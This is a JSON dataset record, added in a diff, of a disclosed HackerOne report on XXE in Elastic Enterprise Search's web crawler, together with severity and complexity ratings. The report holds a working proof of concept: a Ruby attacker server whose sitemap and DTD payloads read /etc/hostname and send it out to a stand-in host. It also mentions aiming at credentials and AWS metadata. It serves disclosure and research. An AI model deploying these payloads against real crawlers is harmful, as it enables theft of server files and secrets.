@@ -1,0 +1,42 @@
+{
+  "reported_to": "Elastic",
+  "reported_by": "dee-see ",
+  "title": "XXE in Enterprise Search's App Search web crawler",
+  "content": "\nSummary\nHello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when parsing sitemaps. Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.\nDescription\nEnterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for robots.txt files and in that file it will look for the sitemap directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.\nThe code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.\nSteps to reproduce\nAttacker Server\nThis is my attacker server, it's a ruby application that requires sinatra (gem install sinatra)\nCode 926 Bytes\n1require 'sinatra'\n2\n3set :bind, '0.0.0.0'\n4\n5get '/robots.txt' do\n6\n7  'User-agent: *\n8Disallow:\n9\n10sitemap: /sitemap.xml\n11'\n12end\n13\n14get '/sitemap.xml' do\n15  content_type 'application/xml'\n16\n17  '<?xml version=\"1.0\" encoding=\"utf-8\"?>\n18<!DOCTYPE urlset [\n19<!ENTITY % dtd SYSTEM \"http://YOURDOMAIN.COM/exfil.dtd\">\n20%dtd;\n21%param1;\n22%exfil;\n23]>\n24<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n25    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n26    xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n27<url>\n28    <loc>&test;</loc>\n29    <lastmod>2019-06-19</lastmod>\n30    <changefreq>daily</changefreq>\n31</url>\n32</urlset>'\n33end\n34\n35get '/exfil.dtd' do\n36  content_type 'application/xml-dtd'\n37\n38  '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n39<!ENTITY % data SYSTEM \"file:///etc/hostname\">\n40<!ENTITY % param1 \"<!ENTITY &#x25; exfil SYSTEM \\'http://YOURDOMAIN.COM/exfil?%data;\\'>\">'\n41end\nSave that to a file and run it with ruby server.rb.\nEnterprise Search\nLog in to Enterprise Search\nClick Launch App Search\nClick Create an Engine, give it any name and click Create Engine\nClick Use the Web Crawler\nEnter the domain hosting the XXE payload as the Domain URL\nClick Start a Crawl and observe your server logs, you should see the hostname of the targetted machine\nRunning this on an Elastic Cloud instance I got this in my log.\nCode 85 Bytes\n120.55.27.97 - - [08/Apr/2021:04:16:02 UTC] \"GET /exfil?d403d12993e0 HTTP/1.1\" 404 459\nWhere d403d12993e0 is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.\nImpact\nAt the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.\n\n",
+  "severity": [
+    9.1,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "XML External Entities (XXE)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1619723100,
+  "report_url": "https://hackerone.com/reports/1156748",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Set up a Ruby server with the provided code to serve malicious robots.txt and sitemap.xml files"
+    ],
+    [
+      2,
+      "Configure Enterprise Search's Web Crawler to crawl the attacker's domain, triggering the XXE vulnerability"
+    ]
+  ],
+  "vuln_description": "The vulnerability is an XML External Entity (XXE) injection in Enterprise Search's App Search web crawler when parsing sitemaps. This allows an attacker to read files from the server, though currently limited to single-line files. The attack exploits the crawler's processing of sitemap directives in robots.txt files.",
+  "reason": "The vulnerability requires setting up a malicious server with specific XML payloads and understanding the crawler's behavior, but the XXE technique itself is well-known and the attack chain is relatively straightforward once the components are in place.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XXE vulnerability in Enterprise Search's App Search web crawler involves parsing sitemaps with external entities, which is a server-side XML processing issue. The proposed methodologies focus on client-side authentication and authorization testing (IDOR and AuthN/AuthZ bypass) by manipulating user sessions and resource IDs. Since the XXE vulnerability does not involve user sessions or resource IDs in the context of application-level access control, it falls outside the scope of the described detection methods.",
+    "is_detectable": false
+  }
+}
